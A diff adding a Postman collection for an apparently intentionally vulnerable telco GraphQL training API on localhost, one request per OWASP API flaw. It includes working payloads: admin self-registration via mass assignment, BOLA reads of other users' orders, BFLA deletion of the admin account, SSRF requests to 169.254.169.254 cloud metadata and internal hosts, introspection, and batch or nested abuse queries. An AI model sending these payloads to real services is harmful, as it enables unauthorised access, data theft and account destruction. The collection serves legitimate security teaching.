@@ -1,0 +1,823 @@
+{
+	"info": {
+		"_postman_id": "graphql-telco-vulnerable-api",
+		"name": "Telco Vulnerable GraphQL API",
+		"description": "Postman collection demonstrating OWASP API Security Top 10 vulnerabilities in the GraphQL implementation. Each request shows a specific security vulnerability for educational purposes.\n\n**Setup:**\n1. Start GraphQL server: `cd graphql && npm start`\n2. Server runs on: `https://localhost:4000/graphql`\n3. Disable SSL verification in Postman (Settings > General > SSL certificate verification OFF)\n\n**Default Users:**\n- Regular User 1: username / password\n- Regular User 2: username2 / password  \n- Admin User: admin / password",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "1. Authentication",
+			"item": [
+				{
+					"name": "Login - Regular User",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"const response = pm.response.json();",
+									"if (response.data && response.data.login) {",
+									"    pm.environment.set('authToken', response.data.login.token);",
+									"    pm.environment.set('customerId', response.data.login.user.customerId);",
+									"    pm.environment.set('username', response.data.login.user.username);",
+									"    console.log('Token saved:', response.data.login.token);",
+									"    console.log('Customer ID:', response.data.login.user.customerId);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/json"
+							}
+						],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation Login($username: String!, $password: String!) {\n  login(input: {username: $username, password: $password}) {\n    token\n    message\n    user {\n      customerId\n      username\n      email\n      isAdmin\n    }\n  }\n}",
+								"variables": "{\n  \"username\": \"username\",\n  \"password\": \"password\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Login with default user credentials. Token is automatically saved to environment variable."
+					},
+					"response": []
+				},
+				{
+					"name": "Login - Admin User",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"const response = pm.response.json();",
+									"if (response.data && response.data.login) {",
+									"    pm.environment.set('adminToken', response.data.login.token);",
+									"    pm.environment.set('adminCustomerId', response.data.login.user.customerId);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation Login($username: String!, $password: String!) {\n  login(input: {username: $username, password: $password}) {\n    token\n    user {\n      customerId\n      username\n      isAdmin\n    }\n  }\n}",
+								"variables": "{\n  \"username\": \"admin\",\n  \"password\": \"password\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Login as admin user. Admin token saved separately."
+					},
+					"response": []
+				},
+				{
+					"name": "Register - Normal User",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation Register($input: RegisterInput!) {\n  register(input: $input) {\n    message\n    user {\n      customerId\n      username\n      email\n      isAdmin\n    }\n  }\n}",
+								"variables": "{\n  \"input\": {\n    \"username\": \"testuser\",\n    \"password\": \"testpass123\",\n    \"email\": \"test@example.com\",\n    \"isAdmin\": false\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Register a new regular user account."
+					},
+					"response": []
+				},
+				{
+					"name": "Register - Exploit Mass Assignment (Admin)",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation RegisterAsAdmin($input: RegisterInput!) {\n  register(input: $input) {\n    message\n    user {\n      customerId\n      username\n      email\n      isAdmin\n    }\n  }\n}",
+								"variables": "{\n  \"input\": {\n    \"username\": \"hacker\",\n    \"password\": \"hacked123\",\n    \"email\": \"hacker@evil.com\",\n    \"isAdmin\": true\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: Mass Assignment\n\nRegisters a user with isAdmin=true. The API accepts this field without validation, allowing privilege escalation during registration."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Current User (Me)",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query GetMe {\n  me {\n    customerId\n    username\n    email\n    isAdmin\n  }\n}",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Get the currently authenticated user's information."
+					},
+					"response": []
+				}
+			],
+			"description": "Authentication mutations including login, registration, and mass assignment vulnerability demonstration."
+		},
+		{
+			"name": "2. BOLA - Broken Object Level Authorization",
+			"item": [
+				{
+					"name": "Create My Order (Legitimate)",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"const response = pm.response.json();",
+									"if (response.data && response.data.createOrder) {",
+									"    pm.environment.set('myOrderId', response.data.createOrder.orderId);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation CreateOrder($input: CreateOrderInput!) {\n  createOrder(input: $input) {\n    orderId\n    productId\n    quantity\n    customerId\n    status\n    orderDate\n  }\n}",
+								"variables": "{\n  \"input\": {\n    \"productId\": \"PROD-5G-PLAN\",\n    \"quantity\": 1,\n    \"customerId\": \"{{customerId}}\"\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Create an order for the authenticated user. Order ID is saved for later use."
+					},
+					"response": []
+				},
+				{
+					"name": "BOLA - Access Other User's Orders",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query GetOtherUsersOrders($customerId: String) {\n  orders(customerId: $customerId) {\n    orderId\n    productId\n    quantity\n    customerId\n    status\n    orderDate\n  }\n}",
+								"variables": "{\n  \"customerId\": \"{{adminCustomerId}}\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: BOLA (Broken Object Level Authorization)\n\nThis request uses a regular user's token but queries another user's orders by specifying their customerId. The API does not validate that the customerId belongs to the authenticated user.\n\n**Exploit:** Change customerId to any other user's ID to see their orders."
+					},
+					"response": []
+				},
+				{
+					"name": "BOLA - Batch Query Multiple Users",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query BatchBOLA($customer1: String, $customer2: String) {\n  victim1: orders(customerId: $customer1) {\n    orderId\n    customerId\n    productId\n  }\n  victim2: orders(customerId: $customer2) {\n    orderId\n    customerId\n    productId\n  }\n  allOrders: orders {\n    orderId\n    customerId\n  }\n}",
+								"variables": "{\n  \"customer1\": \"{{customerId}}\",\n  \"customer2\": \"{{adminCustomerId}}\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: BOLA Amplification via Batch Queries\n\nGraphQL allows batching multiple queries in one request. This amplifies BOLA by accessing multiple users' data simultaneously."
+					},
+					"response": []
+				},
+				{
+					"name": "BOLA - Access Specific Order",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query GetOrder($orderId: ID!) {\n  order(orderId: $orderId) {\n    orderId\n    productId\n    quantity\n    customerId\n    status\n    orderDate\n  }\n}",
+								"variables": "{\n  \"orderId\": \"ANY_ORDER_ID_HERE\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: BOLA\n\nAccess any order by ID without ownership validation. Replace ANY_ORDER_ID_HERE with another user's order ID."
+					},
+					"response": []
+				}
+			],
+			"description": "Demonstrates Broken Object Level Authorization vulnerabilities where users can access other users' data."
+		},
+		{
+			"name": "3. Mass Assignment",
+			"item": [
+				{
+					"name": "Update Order - Legitimate Fields",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation UpdateOrder($orderId: ID!, $input: UpdateOrderInput!) {\n  updateOrder(orderId: $orderId, input: $input) {\n    orderId\n    productId\n    quantity\n    status\n    orderDate\n  }\n}",
+								"variables": "{\n  \"orderId\": \"{{myOrderId}}\",\n  \"input\": {\n    \"quantity\": 5\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Legitimate order update - changing quantity only."
+					},
+					"response": []
+				},
+				{
+					"name": "Mass Assignment - Change Order Status",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation ExploitMassAssignment($orderId: ID!, $input: UpdateOrderInput!) {\n  updateOrder(orderId: $orderId, input: $input) {\n    orderId\n    productId\n    quantity\n    status\n    orderDate\n  }\n}",
+								"variables": "{\n  \"orderId\": \"{{myOrderId}}\",\n  \"input\": {\n    \"quantity\": 999,\n    \"status\": \"completed\"\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: Mass Assignment\n\nThe mutation accepts any field from UpdateOrderInput without restrictions. Users can modify protected fields like 'status' which should only be changed by the system."
+					},
+					"response": []
+				},
+				{
+					"name": "Mass Assignment - Modify Product Order State",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation ExploitProductOrderMassAssignment($orderId: ID!, $input: UpdateProductOrderInput!) {\n  updateProductOrder(orderId: $orderId, input: $input) {\n    orderId\n    state\n    priority\n    description\n  }\n}",
+								"variables": "{\n  \"orderId\": \"PRODUCT_ORDER_ID\",\n  \"input\": {\n    \"state\": \"completed\",\n    \"priority\": \"0\",\n    \"description\": \"Hacked - Changed to highest priority\"\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: Mass Assignment\n\nModify product order state, priority, and other protected fields without authorization."
+					},
+					"response": []
+				}
+			],
+			"description": "Demonstrates mass assignment vulnerabilities where users can modify protected fields."
+		},
+		{
+			"name": "4. BFLA - Broken Function Level Authorization",
+			"item": [
+				{
+					"name": "BFLA - Regular User Deletes Admin",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation DeleteUser($username: String!) {\n  deleteUser(username: $username) {\n    message\n    success\n  }\n}",
+								"variables": "{\n  \"username\": \"admin\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: BFLA (Broken Function Level Authorization)\n\nA regular user can delete any account including admin accounts. The mutation only checks if the user is authenticated, not if they have admin privileges or own the account being deleted."
+					},
+					"response": []
+				},
+				{
+					"name": "BFLA - Delete Another User",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation DeleteUser($username: String!) {\n  deleteUser(username: $username) {\n    message\n    success\n  }\n}",
+								"variables": "{\n  \"username\": \"username2\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: BFLA\n\nDelete another regular user's account without authorization."
+					},
+					"response": []
+				}
+			],
+			"description": "Demonstrates Broken Function Level Authorization where users can access admin functions."
+		},
+		{
+			"name": "5. SSRF - Server-Side Request Forgery",
+			"item": [
+				{
+					"name": "SSRF - Access Cloud Metadata",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation TriggerWebhook($url: String!) {\n  triggerWebhook(url: $url) {\n    message\n    data\n  }\n}",
+								"variables": "{\n  \"url\": \"http://169.254.169.254/latest/meta-data/\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: SSRF (Server-Side Request Forgery)\n\nThe triggerWebhook mutation accepts any URL without validation. This can be exploited to:\n- Access cloud metadata (AWS, Azure, GCP)\n- Scan internal networks\n- Access localhost services\n- Exfiltrate data"
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF - Access Localhost MongoDB",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation TriggerWebhook($url: String!) {\n  triggerWebhook(url: $url) {\n    message\n    data\n  }\n}",
+								"variables": "{\n  \"url\": \"http://localhost:27017\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: SSRF\n\nAccess internal MongoDB service on localhost. Can reveal service information."
+					},
+					"response": []
+				},
+				{
+					"name": "SSRF - Internal Network Scan",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation TriggerWebhook($url: String!) {\n  triggerWebhook(url: $url) {\n    message\n    data\n  }\n}",
+								"variables": "{\n  \"url\": \"http://192.168.1.1\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: SSRF\n\nScan internal network addresses that are not accessible from outside."
+					},
+					"response": []
+				}
+			],
+			"description": "Demonstrates Server-Side Request Forgery vulnerabilities."
+		},
+		{
+			"name": "6. GraphQL Introspection",
+			"item": [
+				{
+					"name": "Full Schema Introspection",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query IntrospectionQuery {\n  __schema {\n    types {\n      name\n      kind\n      description\n      fields {\n        name\n        description\n        type {\n          name\n          kind\n        }\n      }\n    }\n    queryType {\n      name\n      fields {\n        name\n        description\n      }\n    }\n    mutationType {\n      name\n      fields {\n        name\n        description\n      }\n    }\n  }\n}",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: Introspection Enabled\n\nGraphQL introspection is enabled, allowing attackers to enumerate the entire API schema, discover all types, queries, mutations, and their arguments. This reveals the complete attack surface."
+					},
+					"response": []
+				},
+				{
+					"name": "List All Queries",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query ListQueries {\n  __schema {\n    queryType {\n      fields {\n        name\n        description\n        args {\n          name\n          type {\n            name\n            kind\n          }\n        }\n      }\n    }\n  }\n}",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "List all available queries and their arguments via introspection."
+					},
+					"response": []
+				},
+				{
+					"name": "List All Mutations",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query ListMutations {\n  __schema {\n    mutationType {\n      fields {\n        name\n        description\n        args {\n          name\n          type {\n            name\n            kind\n          }\n        }\n      }\n    }\n  }\n}",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Enumerate all mutations available in the API."
+					},
+					"response": []
+				}
+			],
+			"description": "GraphQL-specific vulnerability demonstrating schema introspection."
+		},
+		{
+			"name": "7. Batch Query Attacks",
+			"item": [
+				{
+					"name": "Batch Create Multiple Orders",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation BatchCreateOrders($customerId: String!) {\n  order1: createOrder(input: {productId: \"PROD-1\", quantity: 1, customerId: $customerId}) {\n    orderId\n  }\n  order2: createOrder(input: {productId: \"PROD-2\", quantity: 2, customerId: $customerId}) {\n    orderId\n  }\n  order3: createOrder(input: {productId: \"PROD-3\", quantity: 3, customerId: $customerId}) {\n    orderId\n  }\n  order4: createOrder(input: {productId: \"PROD-4\", quantity: 4, customerId: $customerId}) {\n    orderId\n  }\n  order5: createOrder(input: {productId: \"PROD-5\", quantity: 5, customerId: $customerId}) {\n    orderId\n  }\n}",
+								"variables": "{\n  \"customerId\": \"{{customerId}}\"\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: No Rate Limiting on Batch Operations\n\nGraphQL allows batching multiple mutations in a single request. Without rate limiting, attackers can create hundreds of records in one request."
+					},
+					"response": []
+				},
+				{
+					"name": "Complex Nested Query",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query ComplexNestedQuery {\n  productOrders {\n    orderId\n    state\n    description\n    priority\n    category\n    relatedParty {\n      id\n      name\n      role\n    }\n    productOrderItem {\n      id\n      action\n      quantity\n      product {\n        id\n        name\n        productCharacteristic {\n          name\n          value\n        }\n      }\n    }\n    orderTotalPrice {\n      priceType\n      price {\n        taxIncludedAmount\n        dutyFreeAmount\n        taxRate\n        currencyCode\n      }\n    }\n    billingAccount {\n      id\n      name\n    }\n    note {\n      author\n      date\n      text\n    }\n  }\n}",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "🔴 VULNERABILITY: No Query Complexity Limits\n\nDeeply nested query that fetches all fields. Without complexity limits, this can cause resource exhaustion."
+					},
+					"response": []
+				}
+			],
+			"description": "Demonstrates GraphQL-specific batch query and complexity attacks."
+		},
+		{
+			"name": "8. Product Orders",
+			"item": [
+				{
+					"name": "Create Product Order",
+					"event": [
+						{
+							"listen": "test",
+							"script": {
+								"exec": [
+									"const response = pm.response.json();",
+									"if (response.data && response.data.createProductOrder) {",
+									"    pm.environment.set('productOrderId', response.data.createProductOrder.orderId);",
+									"}"
+								],
+								"type": "text/javascript"
+							}
+						}
+					],
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "mutation CreateProductOrder($input: CreateProductOrderInput!) {\n  createProductOrder(input: $input) {\n    orderId\n    state\n    description\n    priority\n    category\n  }\n}",
+								"variables": "{\n  \"input\": {\n    \"description\": \"5G Mobile Plan Subscription\",\n    \"priority\": \"1\",\n    \"category\": \"mobile\",\n    \"state\": \"acknowledged\",\n    \"productOrderItem\": [\n      {\n        \"id\": \"item-001\",\n        \"action\": \"add\",\n        \"quantity\": 1,\n        \"product\": {\n          \"id\": \"PROD-5G-UNLIMITED\",\n          \"name\": \"5G Unlimited Plan\"\n        }\n      }\n    ]\n  }\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Create a product order (TMF622-style)."
+					},
+					"response": []
+				},
+				{
+					"name": "Get Product Orders",
+					"request": {
+						"auth": {
+							"type": "bearer",
+							"bearer": [
+								{
+									"key": "token",
+									"value": "{{authToken}}",
+									"type": "string"
+								}
+							]
+						},
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "query GetProductOrders($customerId: String, $state: String) {\n  productOrders(customerId: $customerId, state: $state) {\n    orderId\n    state\n    description\n    priority\n    category\n    orderDate\n  }\n}",
+								"variables": "{\n  \"customerId\": null,\n  \"state\": null\n}"
+							}
+						},
+						"url": {
+							"raw": "https://localhost:4000/graphql",
+							"protocol": "https",
+							"host": ["localhost"],
+							"port": "4000",
+							"path": ["graphql"]
+						},
+						"description": "Get product orders with optional filters."
+					},
+					"response": []
+				}
+			],
+			"description": "Product order operations (TMF622-like)."
+		}
+	],
+	"variable": [
+		{
+			"key": "baseUrl",
+			"value": "https://localhost:4000/graphql",
+			"type": "string"
+		}
+	]
+}
